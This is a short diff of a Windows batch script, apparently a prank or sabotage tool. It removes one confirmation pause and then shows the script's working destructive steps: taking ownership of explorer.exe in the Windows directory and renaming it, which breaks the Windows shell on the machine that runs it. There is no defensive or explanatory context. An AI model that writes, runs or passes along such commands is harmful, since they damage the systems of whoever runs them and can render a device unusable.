@@ -21,7 +21,6 @@ echo ==========================================================
 echo Are you sure?
 pause > NUL
 echo Say goodbye to your device...
-pause > NUL
 cd C:\windows\system32
 takeown /f C:\windows\explorer.exe
 ren C:\windows\explorer.exe fishmyass.old
